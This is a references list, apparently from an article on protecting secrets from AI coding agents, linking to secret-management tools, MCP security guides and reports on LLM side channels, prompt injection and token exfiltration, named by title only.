
---

## Sources

- [secretctl — Current Best Option](https://github.com/forest6511/secretctl)
- [Apple Secure Enclave Documentation](https://developer.apple.com/documentation/security/protecting-keys-with-the-secure-enclave)
- [Rust zeroize Crate — Deterministic Memory Clearing](https://docs.rs/zeroize/latest/zeroize/)
- [Rust secrecy Crate — Secret Types](https://crates.io/crates/secrecy)
- [Go memguard — Memory Security Limitations](https://pkg.go.dev/github.com/awnumar/memguard)
- [Memory Security in Go — Why mlock Doesn't Work](https://spacetime.dev/memory-security-go)
- [Whisper Leak — LLM Side-Channel Attack (2025)](https://arxiv.org/abs/2511.03675)
- [Cloudflare — Mitigating Token-Length Side Channels](https://blog.cloudflare.com/ai-side-channel-attack-mitigated/)
- [Thinkst Canarytokens — Honeypot Secrets](https://canarytokens.org/)
- [Claude Code .env Auto-Loading — Knostic](https://www.knostic.ai/blog/claude-loads-secrets-without-permission)
- [CVE-2025-59536 — Token Exfiltration via Project Files](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [Zero-Trust Env Var Security — Claude Code Issue #2695](https://github.com/anthropics/claude-code/issues/2695)
- [Managing Secrets in MCP Servers — Infisical](https://infisical.com/blog/managing-secrets-mcp-servers)
- [MCP Secrets Best Practices — WorkOS](https://workos.com/guide/best-practices-for-mcp-secrets-management)
- [SOPS + age — Encryption at Rest](https://github.com/getsops/sops)
- [HashiCorp Vault MCP Server](https://github.com/hashicorp/vault-mcp-server)
- [Secure MCP Server Guide — William Ogou](https://blog.ogwilliam.com/post/secure-model-context-protocol-mcp-guide)
- [OWASP LLM01:2025 — Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
